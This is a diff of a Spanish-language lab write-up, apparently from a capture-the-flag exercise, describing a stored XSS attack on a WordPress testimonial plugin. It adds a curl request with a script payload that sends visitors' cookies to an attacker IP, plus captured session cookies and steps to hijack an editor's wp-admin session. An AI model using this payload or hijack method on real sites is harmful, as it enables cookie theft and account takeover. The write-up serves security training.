@@ -106,11 +106,11 @@ http://www.trilocor.local/index.php/wp-json/
 y
 http://www.trilocor.local/index.php/wp-json/wp/v2/
 
-## Ataque xss
+## Stored XSS
 
 **Paso 1 — Leer el contenido real del sitio.**
 En la home hay una sección "Leave your testimonial". Su código fuente revela el endpoint. Se obtiene de dos formas equivalentes:
-- _Desde el navegador:_ entre a `http://www.trilocor.local/`, fui a la sección de testimonios, click derecho → "Ver código fuente" y buscar el formulario.
+- _Desde el navegador:_ entre a `http://www.trilocor.local/`, fui a la sección de testimonios, click derecho → "Ver código fuente" y buscque el formulario.
 - _Desde la API REST_ (que devuelve el contenido de la home en crudo):
 ```bash
 curl -s 'http://www.trilocor.local/index.php/wp-json/wp/v2/posts' | grep -i 'action='
@@ -144,14 +144,18 @@ python3 -m http.server 80
 ```
 curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
   --data-urlencode 'name=Cliente' \
+  --data-urlencode 'company_title=ACME' \
   --data-urlencode 'email=a@a.com' \
-  --data-urlencode 'testimonial=<script>new Image().src="http://MI_IP/hook?c="+document.cookie</script>'
+  --data-urlencode 'testimonial=<script>new Image().src="http://10.10.14.22/hook?c="+document.cookie</script>'
 ```
 
 **Paso 6 — Capturo la cookie.** Cuando el revisor (`web-editor`) abre el testimonial, su navegador ejecuta el script y el listener recibe:
 ```
-GET /hook?c=wordpress_logged_in_...=web-editor|...
+GET /hook?c=wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782146326%7Co8ojVl6YFXdQDhkTqC34RCUTxZnZN5xzlLwUUBnNnCr%7Ca5dca2a886099d561ecddfd166c764e342f1eb1d15a87a0ec52fb09f6a562b57;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782146326%7Co8ojVl6YFXdQDhkTqC34RCUTxZnZN5xzlLwUUBnNnCr%7Cce6e051f7354cccc2d71004f07a84944e8f65b0219df49d6868dbd04462463e4;%20wordpress_test_cookie=WP%20Cookie%20check HTTP/1.1" 404 -
 ```
 Las cookies no tenían `HttpOnly`, por eso `document.cookie` pudo leerlas.
 
 **Paso 7 — Secuestrar la sesión.** Cargo esas cookies (decodificando `%7C` → `|`) en el navegador con Cookie-Editor sobre `admin.trilocor.local`, y al entrar a `/wp-admin/` WordPress reconoce la sesión como `web-editor` sin pedir contraseña.
+Abrí Cookie-Editor y creé dos cookies nuevas, una por cada una:
+- Nombre: `wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|0fdf700a49698a0b069a57498190bc8e2e24330b62d2ffa335171acc79196817`
+- Nombre: `wordpress_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|3d54c85847ebb860dfb379cf8b55d0df6e650a57b24ebc1adcbc23912fd627e2`
